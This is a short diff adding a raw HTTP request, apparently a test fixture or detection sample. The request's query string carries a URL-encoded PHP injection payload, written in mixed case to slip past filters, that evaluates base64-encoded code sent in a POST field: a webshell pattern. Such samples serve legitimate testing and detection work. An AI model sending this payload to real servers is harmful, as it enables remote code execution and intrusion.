@@ -1,0 +1,4 @@
+GET /a?url=e%3DEvAl(BaSe64_DeCoDe($_PoSt[Z0])) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
